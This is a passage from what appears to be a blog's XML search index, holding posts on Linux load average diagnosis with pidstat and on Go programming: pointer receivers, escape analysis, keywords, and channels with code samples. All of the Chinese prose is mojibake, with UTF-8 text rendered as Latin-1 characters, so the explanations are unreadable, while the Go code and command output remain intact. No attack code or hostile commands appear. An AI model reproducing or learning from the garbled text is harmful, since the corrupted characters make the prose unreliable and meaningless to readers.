class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">11</span>       <span class="number">1</span>  <span class="number">100.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡ŒpidstatæŸ¥çœ‹æ˜¯å“ªä¸ªè¿›ç¨‹å¯¼è‡´ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># é—´éš” <span class="number">5</span> ç§’åè¾“å‡ºä¸€ç»„æ•°æ®</span><br><span class="line">$ pidstat -u <span class="number">5</span> <span class="number">1</span></span><br><span class="line"><span class="number">13</span>:<span class="number">37</span>:<span class="number">07</span>      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command</span><br><span class="line"><span class="number">13</span>:<span class="number">37</span>:<span class="number">12</span>        <span class="number">0</span>      <span class="number">2962</span>  <span class="number">100.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>  <span class="number">100.00</span>     <span class="number">1</span>  stress</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å½’çº³ä¸€ä¸‹å¹³å‡è´Ÿè½½çš„ç†è§£ã€‚<br>å¹³å‡è´Ÿè½½æ˜¯æŒ‡å•ä½æ—¶é—´å†…ï¼Œç³»ç»Ÿå¤„äº<strong>å¯è¿è¡ŒçŠ¶æ€</strong>å’Œ<strong>ä¸å¯ä¸­æ–­çŠ¶æ€</strong>çš„å¹³å‡è¿›ç¨‹æ•°ï¼Œä¹Ÿå°±æ˜¯<strong>å¹³å‡æ´»è·ƒè¿›ç¨‹æ•°ã€‚</strong><br>å¹³å‡è´Ÿè½½æä¾›äº†ä¸€ä¸ªå¿«é€ŸæŸ¥çœ‹ç³»ç»Ÿæ•´ä½“æ€§èƒ½çš„æ‰‹æ®µï¼Œåæ˜ äº†æ•´ä½“çš„è´Ÿè½½æƒ…å†µã€‚ä½†åªçœ‹å¹³å‡è´Ÿè½½æœ¬èº«ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥å‘ç°ï¼Œåˆ°åº•æ˜¯å“ªé‡Œå‡ºç°äº†ç“¶é¢ˆã€‚æ‰€ä»¥ï¼Œåœ¨ç†è§£å¹³å‡è´Ÿè½½æ—¶ï¼Œä¹Ÿè¦æ³¨æ„ï¼š</p><ul><li>å¹³å‡è´Ÿè½½é«˜æœ‰å¯èƒ½æ˜¯ CPU å¯†é›†å‹è¿›ç¨‹å¯¼è‡´çš„ï¼›</li><li>å¹³å‡è´Ÿè½½é«˜å¹¶ä¸ä¸€å®šä»£è¡¨ CPU ä½¿ç”¨ç‡é«˜ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯ I/O æ›´ç¹å¿™äº†ï¼›</li><li>å½“å‘ç°è´Ÿè½½é«˜çš„æ—¶å€™ï¼Œä½ å¯ä»¥ä½¿ç”¨ mpstatã€pidstat ç­‰å·¥å…·ï¼Œè¾…åŠ©åˆ†æè´Ÿè½½çš„æ¥æºã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goä½¿ç”¨æŒ‡é’ˆç±»å‹ä½œä¸ºæ–¹æ³•çš„æ¥æ”¶è€…çš„ç†ç”±</title>
      <link href="/2022/05/13/go%E4%BD%BF%E7%94%A8%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B%E4%BD%9C%E4%B8%BA%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A5%E6%94%B6%E8%80%85%E7%9A%84%E7%90%86%E7%94%B1/"/>
      <url>/2022/05/13/go%E4%BD%BF%E7%94%A8%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B%E4%BD%9C%E4%B8%BA%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A5%E6%94%B6%E8%80%85%E7%9A%84%E7%90%86%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<ul><li>ä½¿ç”¨æŒ‡é’ˆç±»å‹èƒ½å¤Ÿä¿®æ”¹è°ƒç”¨è€…çš„å€¼ã€‚ </li><li>ä½¿ç”¨æŒ‡é’ˆç±»å‹å¯ä»¥é¿å…åœ¨æ¯æ¬¡è°ƒç”¨æ–¹æ³•æ—¶å¤åˆ¶è¯¥å€¼ï¼Œåœ¨å€¼çš„ç±»å‹ä¸ºå¤§å‹ç»“æ„ä½“æ—¶ï¼Œè¿™æ ·åšä¼šæ›´åŠ é«˜æ•ˆ</li></ul>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goå‡½æ•°è¿”å›å±€éƒ¨å˜é‡çš„æŒ‡é’ˆæ˜¯å¦å®‰å…¨</title>
      <link href="/2022/05/13/go%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E6%8C%87%E9%92%88%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8/"/>
      <url>/2022/05/13/go%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E6%8C%87%E9%92%88%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>ä¸€èˆ¬æ¥è¯´ï¼Œå±€éƒ¨å˜é‡ä¼šåœ¨å‡½æ•°è¿”å›åè¢«é”€æ¯ï¼Œå› æ­¤è¢«è¿”å›çš„å¼•ç”¨å°±æˆä¸ºäº†â€æ— æ‰€æŒ‡â€çš„å¼•ç”¨ï¼Œç¨‹åºä¼šè¿›å…¥æœªçŸ¥çŠ¶æ€ã€‚<br><strong>ä½†è¿™åœ¨ Go ä¸­æ˜¯å®‰å…¨çš„ï¼ŒGo ç¼–è¯‘å™¨å°†ä¼šå¯¹æ¯ä¸ªå±€éƒ¨å˜é‡è¿›è¡Œé€ƒé€¸åˆ†æã€‚å¦‚æœå‘ç°å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸè¶…å‡ºè¯¥å‡½æ•°ï¼Œåˆ™ä¸ä¼šå°†å†…å­˜åˆ†é…åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯åˆ†é…åœ¨å †ä¸Šï¼Œå› ä¸ºä»–ä»¬ä¸åœ¨æ ˆåŒºï¼Œå³ä½¿é‡Šæ”¾å‡½æ•°ï¼Œå…¶å†…å®¹ä¹Ÿä¸ä¼šå—å½±å“ã€‚</strong><br>ç¼–è¯‘æ—¶å¯ä»¥å€ŸåŠ©é€‰é¡¹ -gcflags=-mï¼ŒæŸ¥çœ‹å˜é‡é€ƒé€¸çš„æƒ…å†µã€‚<br><img src="https://snowgo.top/medias/medias/go%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E6%8C%87%E9%92%88%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goæœ‰å“ªäº›å…³é”®å­—</title>
      <link href="/2022/05/13/go%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2022/05/13/go%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<p>goä¸­æœ‰25ä¸ªå…³é”®å­—<br><img src="https://snowgo.top/medias/medias/go%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97/1.png"><br>æ³¨ï¼šfallthroughæ˜¯ç”¨äºæ‰“ç ´switchä¸­é»˜è®¤breakçš„é™åˆ¶</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go_channelç®€ä»‹</title>
      <link href="/2022/05/12/go_channel%E7%AE%80%E4%BB%8B/"/>
      <url>/2022/05/12/go_channel%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="channel-ç®€ä»‹"><a href="#channel-ç®€ä»‹" class="headerlink" title="channel ç®€ä»‹"></a>channel ç®€ä»‹</h3><p>goroutine æ˜¯ Go ä¸­å®ç°å¹¶å‘çš„é‡è¦æœºåˆ¶ï¼Œchannel æ˜¯ goroutine ä¹‹é—´è¿›è¡Œé€šä¿¡çš„é‡è¦æ¡¥æ¢ã€‚<br>ä½¿ç”¨å†…å»ºå‡½æ•° make å¯ä»¥åˆ›å»º channelï¼Œä¸¾ä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)  <span class="comment">// æ³¨æ„ï¼š channel å¿…é¡»å®šä¹‰å…¶ä¼ é€’çš„æ•°æ®ç±»å‹ </span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨ var å£°æ˜ channel, å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ch <span class="keyword">chan</span> <span class="keyword">int</span> </span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå£°æ˜çš„ channel éƒ½æ˜¯åŒå‘çš„ï¼Œæ„å‘³ç€å¯ä»¥è¯¥ channel å¯ä»¥å‘é€æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ¥æ”¶æ•°æ®ã€‚<br>â€œå‘é€â€å’Œâ€œæ¥æ”¶â€æ˜¯ channel çš„ä¸¤ä¸ªåŸºæœ¬æ“ä½œã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ch &lt;- x <span class="comment">// channel æ¥æ”¶æ•°æ® x</span></span><br><span class="line"></span><br><span class="line">x &lt;- ch <span class="comment">// channel å‘é€æ•°æ®å¹¶èµ‹å€¼ç»™ x</span></span><br><span class="line"></span><br><span class="line">&lt;- ch <span class="comment">// channel å‘é€æ•°æ®ï¼Œå¿½ç•¥æ¥å—è€…</span></span><br></pre></td></tr></table></figure><h3 id="channel-buffer"><a href="#channel-buffer" class="headerlink" title="channel buffer"></a>channel buffer</h3><p>ä¸Šæ–‡æåˆ°ï¼Œå¯ä»¥é€šè¿‡ make(chan int) åˆ›å»ºchannelï¼Œæ­¤ç±» channel ç§°ä¹‹ä¸ºéç¼“å†²é€šé“ã€‚äº‹å®ä¸Š channel å¯ä»¥å®šä¹‰ç¼“å†²å¤§å°ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chInt := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)       <span class="comment">// unbuffered channel  éç¼“å†²é€šé“</span></span><br><span class="line">chBool := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>, <span class="number">0</span>)  <span class="comment">// unbuffered channel  éç¼“å†²é€šé“</span></span><br><span class="line">chStr := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">2</span>) <span class="comment">// bufferd channel     ç¼“å†²é€šé“</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºä¸­å¿…é¡»åŒæ—¶æœ‰ä¸åŒçš„ goroutine å¯¹éç¼“å†²é€šé“è¿›è¡Œå‘é€å’Œæ¥æ”¶æ“ä½œï¼Œå¦åˆ™ä¼šé€ æˆé˜»å¡ã€‚<br>ä»¥ä¸‹æ˜¯ä¸€ä¸ªé”™è¯¯çš„ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    ch &lt;- <span class="string">&quot;ping&quot;</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(&lt;-ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µä»£ç è¿è¡Œåæç¤ºé”™è¯¯ï¼š fatal error: all goroutines are asleep - deadlock!ã€‚<br>å› ä¸º main å‡½æ•°æ˜¯ä¸€ä¸ª goroutine, åœ¨è¿™ä¸€ä¸ª goroutine ä¸­å‘é€äº†æ•°æ®ç»™éç¼“å†²é€šé“ï¼Œä½†æ˜¯å´æ²¡æœ‰å¦å¤–ä¸€ä¸ª goroutine ä»éç¼“å†²é€šé“ä¸­é‡Œè¯»å–æ•°æ®ï¼Œ æ‰€ä»¥é€ æˆäº†é˜»å¡æˆ–è€…ç§°ä¸ºæ­»é”ã€‚<br>åœ¨ä»¥ä¸Šä»£ç ä¸­æ·»åŠ ä¸€ä¸ª goroutine ä»éç¼“å†²é€šé“ä¸­è¯»å–æ•°æ®ï¼Œç¨‹åºå°±å¯ä»¥æ­£å¸¸å·¥ä½œã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ch &lt;- <span class="string">&quot;ping&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    fmt.Println(&lt;-ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸éç¼“å†²é€šé“ä¸åŒï¼Œç¼“å†²é€šé“å¯ä»¥åœ¨åŒä¸€ä¸ª goroutine å†…æ¥æ”¶å®¹é‡èŒƒå›´å†…çš„æ•°æ®ï¼Œå³ä¾¿æ²¡æœ‰å¦å¤–çš„ goroutine è¿›è¡Œè¯»å–æ“ä½œï¼Œå¦‚ä¸‹ä»£ç å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    ch &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    ch &lt;- <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•å‘-channel"><a href="#å•å‘-channel" class="headerlink" title="å•å‘ channel"></a>å•å‘ channel</h3><p>å•å‘é€šé“å³é™å®šäº†è¯¥ channel åªèƒ½æ¥æ”¶æˆ–è€…å‘é€æ•°æ®ï¼Œå•å‘é€šé“é€šå¸¸ä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receive</span><span class="params">(receiver <span class="keyword">chan</span>&lt;- <span class="keyword">string</span>, msg <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    receiver &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(sender &lt;-<span class="keyword">chan</span> <span class="keyword">string</span>, receiver <span class="keyword">chan</span>&lt;- <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    msg := &lt;-sender</span><br><span class="line">    receiver &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    receive(ch1, <span class="string">&quot;pass message&quot;</span>)</span><br><span class="line">    send(ch1, ch2)</span><br><span class="line"></span><br><span class="line">    fmt.Println(&lt;-ch2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å˜é‡å£°æ˜ä¸­æ˜¯ä¸åº”è¯¥å‡ºç°å•å‘é€šé“çš„ï¼Œå› ä¸ºé€šé“æœ¬æ¥å°±æ˜¯ä¸ºäº†é€šä¿¡è€Œç”Ÿï¼Œåªèƒ½æ¥æ”¶æˆ–è€…åªèƒ½å‘é€æ•°æ®çš„é€šé“æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ è¯·çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> &lt;- <span class="keyword">string</span> , <span class="number">1</span>)</span><br><span class="line">    ch &lt;- <span class="string">&quot;str&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­ä¸­å®šä¹‰äº†ä¸€ä¸ªåªèƒ½ç”¨æ¥æ¥æ”¶æ•°æ®çš„é€šé“ï¼Œä»è¯­æ³•ä¸Šæ¥çœ‹æ²¡æœ‰é”™è¯¯ï¼Œä½†è¿™æ˜¯ä¸€ç§ç³Ÿç³•çš„å®è·µã€‚</p><h3 id="channel-éå†å’Œå…³é—­"><a href="#channel-éå†å’Œå…³é—­" class="headerlink" title="channel éå†å’Œå…³é—­"></a>channel éå†å’Œå…³é—­</h3><p>close() å‡½æ•°å¯ä»¥ç”¨äºå…³é—­ channelï¼Œå…³é—­åçš„ channel ä¸­å¦‚æœæœ‰ç¼“å†²æ•°æ®ï¼Œä¾ç„¶å¯ä»¥è¯»å–ï¼Œä½†æ˜¯æ— æ³•å†å‘é€æ•°æ®ç»™å·²ç»å…³é—­çš„channelã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line"></span><br><span class="line">    res := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> v := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        res += v</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(res)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="select-è¯­å¥"><a href="#select-è¯­å¥" class="headerlink" title="select è¯­å¥"></a>select è¯­å¥</h3><p>select ä¸“é—¨ç”¨äºé€šé“å‘é€å’Œæ¥æ”¶æ“ä½œï¼Œçœ‹èµ·æ¥å’Œ switch å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯è¿›è¡Œé€‰æ‹©å’Œåˆ¤æ–­çš„æ–¹æ³•å®Œå…¨ä¸åŒã€‚<br>åœ¨ä¸‹è¿°ä¾‹å­ä¸­ï¼Œé€šè¿‡ select çš„ä½¿ç”¨ï¼Œä¿è¯äº† worker ä¸­çš„äº‹åŠ¡å¯ä»¥æ‰§è¡Œå®Œæ¯•åæ‰é€€å‡º main å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strWorker</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;do something with strWorker...&quot;</span>)</span><br><span class="line">    ch &lt;- <span class="string">&quot;str&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intWorker</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;do something with intWorker...&quot;</span>)</span><br><span class="line">    ch &lt;- <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    chStr := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    chInt := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> strWorker(chStr)</span><br><span class="line">    <span class="keyword">go</span> intWorker(chInt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-chStr:</span><br><span class="line">            fmt.Println(<span class="string">&quot;get value from strWorker&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> &lt;-chInt:</span><br><span class="line">            fmt.Println(<span class="string">&quot;get value from intWorker&quot;</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€è€ƒï¼š å¦‚æœä¸Šè¿°ä¾‹å­ä¸­ï¼Œæ²¡æœ‰è¿™ä¸ª select ï¼Œé‚£ä¹ˆ worker å‡½æ•°æ˜¯å¦æœ‰æœºä¼šæ‰§è¡Œï¼Ÿ<br>å®é™…æƒ…å†µæ˜¯æ²¡æœ‰ï¼Œå› ä¸ºmainä¹Ÿæ˜¯ä¸€ä¸ªåç¨‹ï¼Œè¿è¡Œå®Œä¹‹åå°±é€€å‡ºäº†ã€‚</p><h3 id="é€šè¿‡-channel-å®ç°åŒæ­¥æœºåˆ¶"><a href="#é€šè¿‡-channel-å®ç°åŒæ­¥æœºåˆ¶" class="headerlink" title="é€šè¿‡ channel å®ç°åŒæ­¥æœºåˆ¶"></a>é€šè¿‡ channel å®ç°åŒæ­¥æœºåˆ¶</h3><p>ä¸€ä¸ªç»å…¸çš„ä¾‹å­å¦‚ä¸‹ï¼Œmain å‡½æ•°ä¸­èµ·äº†ä¸€ä¸ª goroutineï¼Œé€šè¿‡éç¼“å†²é˜Ÿåˆ—çš„ä½¿ç”¨ï¼Œèƒ½å¤Ÿä¿è¯åœ¨ goroutine æ‰§è¡Œç»“æŸä¹‹å‰ main å‡½æ•°ä¸ä¼šæå‰é€€å‡ºã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="keyword">bool</span>)</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;start working...&quot;</span>)</span><br><span class="line">    done &lt;- <span class="literal">true</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;end working...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> worker(done)</span><br><span class="line"></span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ€è€ƒï¼šå¦‚æœæŠŠä¸Šè¿°ä¾‹å­ä¸­çš„ &lt;-done æ³¨é‡Šæ‰ï¼Œè¿è¡Œç»“æœä¼šå¦‚ä½•ï¼Ÿ<br>doneæ³¨é‡Šæ‰åˆ™ä¸ä¼šèµ·åˆ°é˜»å¡çš„æ•ˆæœï¼Œæ‰€ä»¥ä¸ä¼šæœ‰ä»»ä½•è¾“å‡ºã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="keyword">bool</span>)</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;start working...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    fmt.Println(<span class="string">&quot;end working...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    done &lt;- <span class="literal">true</span> <span class="comment">// doneæ”¾åœ¨æœ€ä¸‹é¢å¯ä»¥ä¿è¯ä¸Šé¢ä¸¤è¡Œéƒ½èƒ½è¾“å‡º</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> worker(done)</span><br><span class="line"></span><br><span class="line">    &lt;- done</span><br><span 